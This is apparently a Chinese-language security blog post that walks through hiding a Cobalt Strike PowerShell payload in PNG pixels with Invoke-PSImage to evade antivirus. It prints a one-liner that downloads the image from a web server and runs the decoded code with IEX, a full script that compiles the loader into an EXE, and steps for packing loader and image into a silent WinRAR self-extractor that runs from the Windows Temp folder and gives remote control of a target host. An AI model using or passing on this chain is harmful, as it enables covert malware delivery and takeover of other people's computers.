看了这篇文章

[ _https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==∣=2247500137
&idx=1&sn=327c5b07e19780c6d30585817b5afb69&chksm=ec1c9456db6b1d40d8a3fd172d74d66f3d56bdcca11ab031973f9ae309e507f3ada69b36cf78&mpshare=1&scene=23&srcid=0926lgtlHOLeHtN3OrPt8d6J&sharer_sharetime_](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247500137&idx=1&sn=327c5b07e19780c6d30585817b5afb69&chksm=ec1c9456db6b1d40d8a3fd172d74d66f3d56bdcca11ab031973f9ae309e507f3ada69b36cf78&mpshare=1&scene=23&srcid=0926lgtlHOLeHtN3OrPt8d6J&sharer_sharetime)

可以利用RGB隐写shellcode

不禁展开了思考，就如misc里面多种隐写方式（二进制改压缩包；图片修改解析新的图片码；snowfall等多个不规则编码带编码源件加以解析），不知道能不能配合shell进行免杀修改，配合常规免杀，如果可以，这也不失为一个好方法。由此对这篇文章产生了极大兴趣，并对此进行复现

将演示利用隐写术将 Shellcode 隐写入 PNG 图片 RGB 像素中，从而隐藏后门代码，并进行远程加载控制目标主机。

需要使用 Invoke-PSImage 工具：

  * 项目地址：https://github.com/peewpw/Invoke-PSImage

首先使用 Cobalt Strike 生成 Powershell
类型（.ps1）的![1633576777_615e6749c574f529842dd.png!small?1633576777056](https://image.3001.net/images/20211007/1633576777_615e6749c574f529842dd.png!small?1633576777056)

![1633576785_615e675133d8e9b29c3d6.png!small?1633576784530](https://image.3001.net/images/20211007/1633576785_615e675133d8e9b29c3d6.png!small?1633576784530)

![1633576790_615e6756735b1ac68d747.png!small?1633576789897](https://image.3001.net/images/20211007/1633576790_615e6756735b1ac68d747.png!small?1633576789897)

然后将刚才生成的 payload.ps1 文件放在 Invoke-PSImage 项目内，再准备一张图片用于生成一张带有 Shellcode 的图片，二者与
Invoke-PSImage.ps1
文件在同一目录：![1633576819_615e6773ea54f72e061e7.png!small?1633576819257](https://image.3001.net/images/20211007/1633576819_615e6773ea54f72e061e7.png!small?1633576819257)

打开poweshell执行以下命令即可生成一个带有 Shellcode 的图片 shell.png：

# 设置执行策略

Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# 导入 Invoke-PSimage.ps1 文件

Import-Module .\Invoke-PSimage.ps1

# 生成带有 Shellcode 的图片

Invoke-PSImage -Script .\payload.ps1 -Image .\2.jpg -Out .\shell.png
-Web![1633576831_615e677f36a7c8590b6bc.png!small?1633576830579](https://image.3001.net/images/20211007/1633576831_615e677f36a7c8590b6bc.png!small?1633576830579)

报错。原因是我直接用的jiff改为jpg图片，导致索引超出数组界限![1633576839_615e678726b22d56c88d0.png!small?1633576838437](https://image.3001.net/images/20211007/1633576839_615e678726b22d56c88d0.png!small?1633576838437)

重新上传一个真正的任意jpg图片即可

运行命令![1633576851_615e67931e6d037c071a3.png!small?1633576850529](https://image.3001.net/images/20211007/1633576851_615e67931e6d037c071a3.png!small?1633576850529)

运行之后得到一串代码

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a
Net.WebClient).OpenRead("http://example.com/shell.png"));$o=a Byte[]
4000;(0..3)|%{foreach($x
in(0..999)){$p=$g.GetPixel($x,$_);$o[$_*1000+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G
-band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3245]))

并得到shell.Png图片![1633576857_615e6799bc9cf6b7a1c4d.png!small?1633576857089](https://image.3001.net/images/20211007/1633576857_615e6799bc9cf6b7a1c4d.png!small?1633576857089)

接着，我们在自己的 歪批s 上开启一个 Web 服务，用于托管得到的
shell.png：![1633576872_615e67a82c837427f63d0.png!small?1633576871689](https://image.3001.net/images/20211007/1633576872_615e67a82c837427f63d0.png!small?1633576871689)

然后将上面得到的代码中的 http://example.com/shell.png 改为我们自己的 Web
服务地址：![1633576878_615e67aea5b32328aff31.png!small?1633576877944](https://image.3001.net/images/20211007/1633576878_615e67aea5b32328aff31.png!small?1633576877944)

在目标主机上执行这段代码后目标机成功上线![1633576881_615e67b1e4adab7226c81.png!small?1633576881295](https://image.3001.net/images/20211007/1633576881_615e67b1e4adab7226c81.png!small?1633576881295)

我们还可以将上面那段加载的命令编译生成可执行文件，这里我们直接使用网上找的脚本进行编译：

\-----------------------------------------------------------------------------------------------------------------
function Convert-PS1ToExe{ param( [Parameter(Mandatory=$true)]
[ValidateScript({$true})] [ValidateNotNullOrEmpty()] [IO.FileInfo]$ScriptFile
) if( -not $ScriptFile.Exists) { Write-Warning "$ScriptFile not exits." return
} [string]$csharpCode = @' using System; using System.IO; using
System.Reflection; using System.Diagnostics; namespace LoadXmlTestConsole {
public class ConsoleWriter { private static void
Proc_OutputDataReceived(object sender,
System.Diagnostics.DataReceivedEventArgs e) { Process pro = sender as Process;
Console.WriteLine(e.Data); } static void Main(string[] args) { // Set title of
console Console.Title = "Powered by PSTips.Net"; // read script from resource
Assembly ase = Assembly.GetExecutingAssembly(); string scriptName =
ase.GetManifestResourceNames()[0]; string scriptContent = string.Empty; using
(Stream stream = ase.GetManifestResourceStream(scriptName)) using
(StreamReader reader = new StreamReader(stream)) { scriptContent =
reader.ReadToEnd(); } string scriptFile =
Environment.ExpandEnvironmentVariables(string.Format("%temp%\\\\{0}",
scriptName)); try { // output script file to temp path
File.WriteAllText(scriptFile, scriptContent); ProcessStartInfo proInfo = new
ProcessStartInfo(); proInfo.FileName = "PowerShell.exe";
proInfo.CreateNoWindow = true; proInfo.RedirectStandardOutput = true;
proInfo.UseShellExecute = false; proInfo.Arguments = string.Format(" -File
{0}",scriptFile); var proc = Process.Start(proInfo); proc.OutputDataReceived
+= Proc_OutputDataReceived; proc.BeginOutputReadLine(); proc.WaitForExit();
Console.WriteLine("Hit any key to continue..."); Console.ReadKey(); } catch
(Exception ex) { Console.WriteLine("Hit Exception: {0}", ex.Message); }
finally { // delete temp file if (File.Exists(scriptFile)) {
File.Delete(scriptFile); } } } } }'@ # $providerDict $providerDict = New-Object 'System.Collections.Generic.Dictionary[[string],[string]]'
$providerDict.Add('CompilerVersion','v4.0') $codeCompiler =
[Microsoft.CSharp.CSharpCodeProvider]$providerDict # Create the optional
compiler parameters $compilerParameters = New-Object
'System.CodeDom.Compiler.CompilerParameters'
$compilerParameters.GenerateExecutable = $true
$compilerParameters.GenerateInMemory = $true $compilerParameters.WarningLevel
= 3 $compilerParameters.TreatWarningsAsErrors = $false
$compilerParameters.CompilerOptions = '/optimize' $outputExe = Join-Path
$ScriptFile.Directory "$($ScriptFile.BaseName).exe"
$compilerParameters.OutputAssembly = $outputExe
$compilerParameters.EmbeddedResources.Add($ScriptFile.FullName) > $null
$compilerParameters.ReferencedAssemblies.Add(
[System.Diagnostics.Process].Assembly.Location ) > $null # Compile Assembly
$compilerResult =
$codeCompiler.CompileAssemblyFromSource($compilerParameters,$csharpCode) #
Print compiler errors if($compilerResult.Errors.HasErrors) { Write-Host
'Compile faield. See error message as below:' -ForegroundColor Red
$compilerResult.Errors | foreach { Write-Warning ('{0},[{1},{2}],{3}' -f
$_.ErrorNumber,$_.Line,$_.Column,$_.ErrorText ) } } else { Write-Host 'Compile
succeed.' -ForegroundColor Green "Output executable file to '$outputExe'" }}

\--------------------------------------------------------------------------------------------------------------------
首先将那段用于加载 Shellcode 的命令写入文件 Loader.ps1
中：![1633576919_615e67d7903498ea9408c.png!small?1633576918909](https://image.3001.net/images/20211007/1633576919_615e67d7903498ea9408c.png!small?1633576918909)

然后执行以下命令，使用 Convert-PS1ToExe.ps1 将 Loader.ps1 编译成 EXE：

Import-Module .\Convert-PS1ToExe.ps1

Convert-PS1ToExe -ScriptFile
.\Loader.ps1![1633576923_615e67dbac8c43eee8eef.png!small?1633576923034](https://image.3001.net/images/20211007/1633576923_615e67dbac8c43eee8eef.png!small?1633576923034)

将生成的 exe.jpg
上传到目标主机并执行：![1633576928_615e67e0ecfa1b8e175da.png!small?1633576928419](https://image.3001.net/images/20211007/1633576928_615e67e0ecfa1b8e175da.png!small?1633576928419)

如上图所示，目标机成功上线。美中不足的是有个弹窗。

使用远程加载固然方便，但是由于生成的图片非常大，远程加载所耗的时间较长，所以我们可以尽可能的本地加载。

###  ** **本地加载**** ** **（**** ** **在对方机器放置整合包（能直接exe执行改shell）**** ** **）****

执行以下命令即可生成一个带有 Shellcode 的图片 shell.png：

# 设置执行策略Set-ExecutionPolicy Unrestricted -Scope CurrentUser# 导入 Invoke-PSimage.ps1 文件Import-Module .\Invoke-PSimage.ps1# 生成带有 Shellcode 的图片Invoke-PSImage -Script .\payload.ps1 -Image .\origin.jpg -Out
.\shell.png![1633576937_615e67e9586c1c8aa646d.png!small?1633576936740](https://image.3001.net/images/20211007/1633576937_615e67e9586c1c8aa646d.png!small?1633576936740)

如上图所示，生成了包含 Shellcode 的图片 shell.png 与加载 Shellcode 使用的代码

执行上面的命令，在本地加载图片里的 Shellcode：

上线后

下面，我们将这种本地加载中的加载命令也用之前的方式编译成可执行文件：![1633576942_615e67ee03f7ff91befb8.png!small?1633576941324](https://image.3001.net/images/20211007/1633576942_615e67ee03f7ff91befb8.png!small?1633576941324)

![1633576952_615e67f830460c66cb9fa.png!small?1633576951780](https://image.3001.net/images/20211007/1633576952_615e67f830460c66cb9fa.png!small?1633576951780)

此时执行 Loader.exe 便可以加载 shell.png 中的 Shellcode，但二者必须在同一目录下。为了方便，我们还需要完善一下。

这里我们参考使用 WinRAR 自解压捆绑木马的思路，将 shell.png 和 Loader.exe
压缩在一起，并设置成自解压格式，那么当用户运行时，二者便会被解压到相同的目录并自动执行 Loader.exe。

首先，选中这两个文件，鼠标右键，将这两个文件添加到压缩文件。点击 “创建自解压格式压缩文件”，此时rar就会变成 exe
后缀的文件：![1633576958_615e67fe3cee19fc0228b.png!small?1633576957609](https://image.3001.net/images/20211007/1633576958_615e67fe3cee19fc0228b.png!small?1633576957609)

接下来这个方法值得深究一番（给它改成exe。Dll。Pyc等啥文件）![1633576974_615e680e028f2d2788188.png!small?1633576973597](https://image.3001.net/images/20211007/1633576974_615e680e028f2d2788188.png!small?1633576973597)

然后点击“高级”—>“自解压文件选项”—>“常规”![1633576979_615e6813c1940c4c0114d.png!small?1633576979610](https://image.3001.net/images/20211007/1633576979_615e6813c1940c4c0114d.png!small?1633576979610)

设置解压后文件的存储路径为
C:\WINDOWS\Temp：![1633576985_615e68191448f7ab49a90.png!small?1633576984580](https://image.3001.net/images/20211007/1633576985_615e68191448f7ab49a90.png!small?1633576984580)

然后，进入“安装”（有的版本也叫“设置”），填入解压完成后需要执行的程序：![1633576992_615e6820ba178976b5b96.png!small?1633576992353](https://image.3001.net/images/20211007/1633576992_615e6820ba178976b5b96.png!small?1633576992353)

然后，进入“模式”，选择模式为“全部隐藏”：![1633576998_615e68261c03ee4ebf9d0.png!small?1633576997464](https://image.3001.net/images/20211007/1633576998_615e68261c03ee4ebf9d0.png!small?1633576997464)

然后，进入“更新”，将更新方式设置为“解压并更新文件”，覆盖方式设置为“覆盖所有文件”：![1633577003_615e682b5055914b1ab79.png!small?1633577002738](https://image.3001.net/images/20211007/1633577003_615e682b5055914b1ab79.png!small?1633577002738)

最后点击确定，即可生成一个 Desktop.exe
的文件：![1633577008_615e6830c1ce756a399e1.png!small?1633577008042](https://image.3001.net/images/20211007/1633577008_615e6830c1ce756a399e1.png!small?1633577008042)

运行 Desktop.exe 即可成功上线

